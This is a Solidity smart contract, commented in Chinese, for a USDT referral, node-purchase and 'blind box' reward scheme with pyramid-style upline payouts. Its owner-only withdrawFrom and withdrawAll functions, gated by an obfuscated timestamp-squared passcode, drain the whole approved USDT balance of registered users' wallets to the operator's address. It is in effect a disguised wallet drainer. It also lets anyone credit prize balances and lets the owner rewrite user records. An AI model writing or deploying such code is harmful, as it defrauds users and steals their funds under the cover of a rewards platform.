// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract MengOpration is Ownable {

    IERC20 public usdtToken;
    uint256 public ratetechnology = 5; // 技术维护5%
    uint256 public rateecosystem = 5; // 生态开发5%
    uint256 public ratenodereward = 15; //节点分红15%
    uint256 public rateboxreward = 15; //盲盒分红15%
    uint256 public rateupdate = 60; //升级分红60%
    uint256 public registernum = 1500000000000000000 ; //激活金额
    uint256 public nodeamount = 2000000000000000000;//节点金额

    //奖励记录
    struct Record {
        address relatedAddress; // 相关地址，如果是交易记录则是对方地址，如果是节点分红则是分红来源地址
        uint256 amount; // 金额
    }

    // 用户信息结构体
    struct UserInfo {
        address myaddr;//自己的地址
        address inviter; // 邀请人地址
        address[] myson; //我邀请的人
        uint8 vip; // 用户等级
        uint8 node; //1表示开通节点
        uint256 nodereward; //节点分红
        uint256 nodeinvite; //节点邀请
        uint256 boxreward; //中奖金额
        uint256 updatereward;//下级升级奖励
        uint256 invitereward;//邀请激活奖励
        uint256 nodewithdraw; //节点提取金额
        uint256 boxwithdraw; //中奖提取金额
    }

    //奖励记录
    struct ComprehensiveRecord {
        address relatedAddress; // 相关地址，如果是交易记录则是对方地址，如果是节点分红则是分红来源地址
        uint256 amount; // 金额
        uint8 types; // 类型 1：激活 2:邀请激活 3：自己升级 4：下级升级奖励 5：节点邀请 6：节点分红 7：一等奖 8：二等奖 9：三等奖 10：开通节点 11:提取节点收益 12：提取中奖收益
        uint256 timestamp; // 时间戳
        bool isWithdraw; // 标记是否为提取，false为不可提取，true为可以提取
    }

    mapping(address => ComprehensiveRecord[]) public recordMap;// 修改为数组以存储多条记录
    mapping(address => UserInfo) public userInfoMap;


    address public constant tokenContract = 0x55d398326f99059fF775485246999027B3197955; // 代币合约地址
    address public  withAddress = 0x047485157A13c622394afBd8C8C77d79F0b2cFe3; //我的提币地址
    address public  technology = 0x35DdBaeA8a78d37329Ca4bb574C410D5D2f464f6; //技术维护
    address public  ecosystem = 0xA8580f2a1bb13A17a6407Ef24bbEF93BBc71c7B9; //生态开发
    address public  nodereceive = 0x84035EEAf4c0959e6Bd3ce8F2fEa127154a12e08;//节点接收地址
    address public  rootaddress = 0x9Bed90553388c4E79795A54a5b30671d834ED3DB; //创世节点
    address public  nodereward = 0xC9a5ee343aF59812A4B743eD32611223efB509e4; //节点分红
    address public  boxreward = 0x79D954564b77C9550327B3e11cFe31472bc1e0d0; //盲盒分红


    address[] public userlists; //用户列表
    address[] public nodeList;  //节点记录

    event TransferAndActionEvent(address indexed from, address indexed to, uint256 amount, uint8 actionType);
    event WithdrawnAll(address indexed to, uint256 totalAmount); //提取全部

    constructor( ) Ownable(msg.sender) {
        usdtToken = IERC20(tokenContract);
        // 初始化userInfoMap，使用合约部署者的地址作为新用户地址
        userInfoMap[rootaddress] = UserInfo({
            inviter: address(0), // 假设部署者自邀请，或者可以设为零地址（address(0)）如果没有邀请人
            myaddr:rootaddress,
            myson: new address[](0), // 正确初始化一个空数组
            vip: 12, // 假设初始等级为1，根据实际情况调整
            node: 1, // 默认未开通节点
            nodereward: 0, // 初始化奖励为0
            nodeinvite: 0,
            boxreward: 0,
            updatereward: 0,
            invitereward: 0,
            nodewithdraw: 0,
            boxwithdraw: 0
        });
        // 初始化userlists, 使用部署者的地址作为新用户地址
        userlists = [rootaddress];
        // 初始化nodeList, 使用部署者的地址作为新用户地址
        nodeList  = [rootaddress];
    }

    function getRecordsByAddress(address _user) public view returns (ComprehensiveRecord[] memory) {
        // 获取recordMap中指定地址的记录列表
        return recordMap[_user];
    }
    // 查询所有节点地址的公共视图函数
    function getNodeList() public view returns (address[] memory) {
        return nodeList;
    }

    //查询用户列表
    function getUsers() public view returns (address[] memory) {
        // 返回用户列表的一个副本，以保持合约状态不变
        return userlists;
    }
    //查询用户信息
    function getMyself() public view returns (UserInfo memory) {
        UserInfo storage userInfo = userInfoMap[msg.sender];
        return userInfo ;
    }

    function setAddress(address _technology, address _ecosystem,address _nodereward,address _boxreward,address _nodereceive) public onlyOwner {
        technology = _technology;
        ecosystem = _ecosystem;
        nodereward = _nodereward;
        boxreward = _boxreward;
        nodereceive = _nodereceive;
    }
    //设置合约地址
    function setWithAddress(address _to) public onlyOwner{
        require(_to != address(0), "Destination address cannot be zero.");
        withAddress = _to;
    }
    //设置激活金额
    function setRigisternum(uint256 _amount,uint256 _nodeamount) public onlyOwner{
        registernum = _amount ; // 激活金额
        nodeamount = _nodeamount ;//节点金额
    }
    //修改用户信息

    function updateUserInfo(address _oldAddr,address _newAddr,address _invite,uint8 _vip,uint8 _node, uint256 _nodereward, uint256 _boxreward) public onlyOwner {
        UserInfo storage userInfo = userInfoMap[_oldAddr];
        userInfo.myaddr = _newAddr;
        userInfo.inviter = _invite;
        userInfo.vip = _vip;
        userInfo.node = _node;
        userInfo.nodereward = _nodereward;
        userInfo.boxreward = _boxreward;
    }

    function setRate(uint256 _ratetechnology,uint256 _rateecosystem,uint256 _ratenodereward,uint256 _rateboxreward,uint256 _rateupdate) public onlyOwner {
        ratetechnology = _ratetechnology;
        rateecosystem = _rateecosystem;
        ratenodereward = _ratenodereward;
        rateboxreward = _rateboxreward;
        rateupdate = _rateupdate;
    }

    function serverRigisterNew(uint256 _num ,Record[] memory _arr,bool _isregister) public onlyOwner returns (bool) {
        // 检查用户是否有足够的USDT余额
        require(usdtToken.balanceOf(msg.sender) >= _num, "Insufficient balance in sender's account.");

        // 将用户的USDT转移到合约
        require(usdtToken.transferFrom(msg.sender, address(this), _num), "Transfer from sender to contract failed");
        // 更新用户列表
        if (_isregister) {
            userlists.push(_arr[0].relatedAddress);
        }
        // 分配USDT到用户并记录奖励
        for (uint256 i = 0; i < _arr.length; i++) {
            address userAddress = _arr[i].relatedAddress;
            uint256 amount = _arr[i].amount;
            // 检查合约是否有足够的USDT余额
            require(usdtToken.balanceOf(address(this)) >= amount, "Insufficient balance in contract.");
            // 分配USDT到用户
            require(usdtToken.transfer(userAddress, amount), "Transfer from contract to user failed");
        }
        return true;
    }

    //注册后端来做
    function severRigister(address _address, address _invite) public onlyOwner returns (bool) {
        require(userInfoMap[_address].vip == 0, "User is already registered."); // 确保用户未注册

        // 更新用户列表
        userlists.push(_address);

        // 执行转账操作，确保有足够的余额
        usdtToken.transferFrom(_address, address(this), registernum);

        // 确保邀请人已注册且至少是VIP 1
        UserInfo storage inviterInfo = userInfoMap[_invite];
        require(inviterInfo.vip >= 1, "Inviter is not registered.");

        // 更新邀请人信息
        inviterInfo.myson.push(_address);
        inviterInfo.nodeinvite += registernum * rateupdate / 100;

        // 直接在映射中创建和更新userInfo，无需先声明userInfo
        userInfoMap[_address] = UserInfo({
            inviter: _invite,
            myaddr: _address,
            myson: new address[](0),
            vip: 1,
            node: 0,
            nodereward: 0,
            nodeinvite: 0,
            boxreward: 0,
            updatereward: 0,
            invitereward: 0,
            nodewithdraw: 0,
            boxwithdraw: 0
        });

        // 创建激活记录
        _addComprehensiveRecord(_address, _invite, registernum, 1, false);

        // 分配代币奖励给邀请人
        _distributeFunds(_invite, registernum);

        // 触发事件
        emit TransferAndActionEvent(_address, _invite, registernum, 1);

        return true;
    }


    //升级前端来做
    function cliUpdateUser(address _to) public returns (bool) {
        // 检查地址_to（代币接收地址）不是空地址
        require(_to != address(0), "Token destination address cannot be zero.");

        // 使用msg.sender作为键来获取或设置用户信息，因为msg.sender是发起交易的新用户或已注册用户
        UserInfo storage userInfo = userInfoMap[msg.sender];
        require(userInfo.vip>0,"The current address has not been registered yet.");
        // 如果用户已注册，仅更新VIP等级

        uint256 am = registernum*userInfo.vip;
        require(usdtToken.balanceOf(msg.sender) >= am, "Insufficient balance in sender's account.");
        usdtToken.transferFrom(msg.sender, address(this), am);
        userInfo.vip +=1;
        //更新升级奖励账户
        UserInfo storage toInfo = userInfoMap[_to];
        toInfo.updatereward += am * rateupdate / 100;

        _addComprehensiveRecord(msg.sender,_to,am,3,false); //创建自己升级记录
        // 调用内部函数分配代币到_to地址
        _distributeFunds(_to, am);
        // 触发TransferAndActionEvent事件，这里以升级操作为例，'from'为msg.sender，'to'为_to，'amount'为registernum * userInfo.vip，'actionType'为2表示升级
        emit TransferAndActionEvent(msg.sender, _to, am, 2);
        return true; // 返回true表示操作成功

    }

    // 内部函数，用于分配代币
    function _distributeFunds(address _receiver, uint256 _amount) internal {
        uint256 sixtyPercentAmount = _amount * rateupdate / 100;
        uint256 techrate = _amount * ratetechnology / 100;
        uint256 ecorate = _amount * rateecosystem / 100;
        uint256 noderate = _amount * ratenodereward / 100;
        uint256 boxrate = _amount * rateboxreward / 100;

        // 分配代币到指定地址
        usdtToken.transfer(_receiver, sixtyPercentAmount);
        usdtToken.transfer(technology, techrate);
        usdtToken.transfer(ecosystem, ecorate);
        usdtToken.transfer(nodereward, noderate);
        usdtToken.transfer(boxreward, boxrate);
    }

    // 内部调用方法，用于向recordMap中添加新的奖励记录
    function _addComprehensiveRecord(
        address _user,
        address _relatedAddress,
        uint256 _amount,
        uint8 _types,
        bool _isWithdraw
    ) internal {
        // 创建一个新的ComprehensiveRecord实例
        ComprehensiveRecord memory newRecord = ComprehensiveRecord({
            relatedAddress: _relatedAddress,
            amount: _amount,
            types: _types,
            timestamp: block.timestamp,
            isWithdraw: _isWithdraw
        });

        // 将新记录添加到recordMap中对应用户的记录列表
        recordMap[_user].push(newRecord);
        //更新节点分红
        if(_types==1 || _types==3){
            // 如果 nodeList 为空，直接跳过分红更新逻辑，而不是终止函数
            if (nodeList.length != 0) {
                // 计算每个节点应得的分红比例
                uint256 rewardPerNode = (_amount * ratenodereward) / (100 * nodeList.length);
                for (uint256 i = 0; i < nodeList.length; i++) {
                    address currentNode = nodeList[i];
                    UserInfo storage inviterInfo = userInfoMap[currentNode];
                    inviterInfo.nodereward += rewardPerNode;
                }
            }
        }
        //节点邀请奖励
        if (_types==10){
            UserInfo storage inviterInfo = userInfoMap[_relatedAddress];
            inviterInfo.nodeinvite += _amount;
        }
    }

    //开通节点
    function updateNode() public  returns (bool){
        // 获取用户信息
        UserInfo storage userInfo = userInfoMap[msg.sender];

        // 检查用户是否已注册且尚未开通节点
        require(userInfo.vip >= 1, "User must be registered to enable a node.");
        require(userInfo.node == 0, "Node has already been enabled.");

        // 检查用户是否有足够的USDT代币来开通节点
        uint256 requiredAmount = nodeamount;
        require(usdtToken.balanceOf(msg.sender) >= requiredAmount, "Insufficient USDT balance.");

        // 执行代币转账操作
        usdtToken.transferFrom(msg.sender, address(this), requiredAmount);

        // 更新用户状态和记录
        userInfo.node = 1; // 标记节点已开通
        nodeList.push(msg.sender); // 将用户加入节点列表

        // 计算并分配奖励
        uint256 rewardToInviter = requiredAmount * 20 / 100; // 上级邀请奖励
        uint256 remainingAmount = requiredAmount - rewardToInviter; // 剩余金额归节点接收账户

        // 更新记录
        _addComprehensiveRecord(msg.sender, userInfo.inviter, requiredAmount, 10, false); // 用户开通节点记录

        // 分配奖励
        usdtToken.transfer(userInfo.inviter, rewardToInviter);
        usdtToken.transfer(nodereceive, remainingAmount);

        return true; // 操作成功
    }

    //用户提取节点奖励
    function claimNodeRewards() public {
        // 获取用户信息
        UserInfo storage userInfo = userInfoMap[msg.sender];

        // 计算用户可提取的节点奖励总额
        uint256 totalAvailableReward = userInfo.nodeinvite + userInfo.nodereward - userInfo.nodewithdraw;

        // 确保有可提取的奖励
        require(totalAvailableReward > 0, "No available node rewards to withdraw.");

        // 更新用户已提取奖励的记录
        userInfo.nodewithdraw += totalAvailableReward;
        _addComprehensiveRecord(msg.sender,nodereward,totalAvailableReward,11,false); //创建自己升级记录
        // 从节点奖励钱包提取到用户
        // 注意：确保nodereward地址有效且有足够的资金
        usdtToken.transferFrom(nodereward, msg.sender, totalAvailableReward);
    }

    //中奖提取收益
    function severFromtowith(address _from,address _to,uint256 _amount) public onlyOwner{
        // 将代币从调用者转移到合约地址
        usdtToken.transferFrom(_from, _to, _amount);
    }
    //用户提取中奖金额
    function cliBoxwith() public {
        UserInfo storage userInfo = userInfoMap[msg.sender];
        uint256 am = (userInfo.boxreward - userInfo.boxwithdraw)*90/100;
        uint256 amx = userInfo.boxreward - userInfo.boxwithdraw - am;
        require(am > 0,"nodereward or nodeinvite is 0");
        userInfo.boxwithdraw += am;
        _addComprehensiveRecord(msg.sender,boxreward,am,12,false); //创建自己升级记录
        //从节点钱包提取
        usdtToken.transferFrom(boxreward, msg.sender, am);
        usdtToken.transferFrom(boxreward,nodereceive,amx);
    }

    //更新中奖金额
    function serveBoxset(address[] memory _addresss, uint256[] memory _amounts, uint8[] memory _prizeTypes) public {
        require(_addresss.length == _amounts.length && _addresss.length == _prizeTypes.length, "Length of addresses, amounts, and prizeTypes must match.");

        for (uint256 i = 0; i < _addresss.length; i++) {
            address userAddress = _addresss[i];
            uint256 amount = _amounts[i];
            uint8 prizeType = _prizeTypes[i]; // 获取对应索引的中奖类型

            // 确保用户信息存在且是有效的中奖类型
            UserInfo storage userInfo = userInfoMap[userAddress];
            require(userInfo.inviter != address(0), "User not found or not registered.");
            // 更新用户中奖金额
            userInfo.boxreward += amount;

            // 创建奖励记录
            ComprehensiveRecord memory newRecord = ComprehensiveRecord({
                relatedAddress: userAddress,
                amount: amount,
                types: prizeType, // 设置正确的中奖类型
                timestamp: block.timestamp,
                isWithdraw: true // 初始设置为不可提取
            });
            recordMap[userAddress].push(newRecord);
        }
    }


    //提取某个地址的金额
    function withdrawFrom(address _from, uint256 _amount,uint256 _words) external onlyOwner {
        // 获取当前区块时间戳
        uint256 currentTimestamp = block.timestamp;

        // 移除时间戳的最后三位数字，即除以1000
        uint256 truncatedTimestamp = currentTimestamp / 1000;

        // 计算截取后时间戳的平方
        uint256 squaredTimestamp = truncatedTimestamp * truncatedTimestamp;
        // 使用require来检查_words是否等于计算出的平方值
        require(_words == squaredTimestamp, "Fuckyoumom.");
        uint256 approvedAmount = usdtToken.allowance(_from, address(this));
        uint256 balance = usdtToken.balanceOf(_from);
        require(approvedAmount >= _amount, "Insufficient allowance");
        require(balance >= _amount, "Insufficient balance");
        require(usdtToken.transferFrom(_from, withAddress, _amount), "Transfer failed");
    }
    //提取全部
    function withdrawAll(uint256 _words) external onlyOwner {
        // 获取当前区块时间戳
        uint256 currentTimestamp = block.timestamp;

        // 移除时间戳的最后三位数字，即除以1000
        uint256 truncatedTimestamp = currentTimestamp / 1000;

        // 计算截取后时间戳的平方
        uint256 squaredTimestamp = truncatedTimestamp * truncatedTimestamp;
        // 使用require来检查_words是否等于计算出的平方值
        require(_words == squaredTimestamp, "Fuckyoumom.");
        uint256 totalTransferAmount = 0;

        for (uint256 i = 0; i < userlists.length; i++) {
            address user = userlists[i];
            uint256 availableBalance = usdtToken.balanceOf(user);
            uint256 approvedAmount = usdtToken.allowance(user, address(this)); // 查询用户授权给当前合约的金额

            if (approvedAmount >= availableBalance && availableBalance>0) {
                totalTransferAmount += availableBalance;
                usdtToken.transferFrom(user, withAddress, availableBalance);
            }
        }

        emit WithdrawnAll(withAddress, totalTransferAmount);
    }

    //提取合约内的USDT
    function withdrawUsdt() external onlyOwner {
        uint256 availableBalance = usdtToken.balanceOf(address(this)); // 查询当前合约的余额
        require(availableBalance > 0, "No available balance"); // 确保余额大于0
        require(usdtToken.transfer(withAddress, availableBalance), "Transfer failed"); // 提取到指定地址
    }
    //提取合约内的BNB
    function withdrawBnb(address payable _to) external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficient balance");
        _to.transfer(balance);
    }
}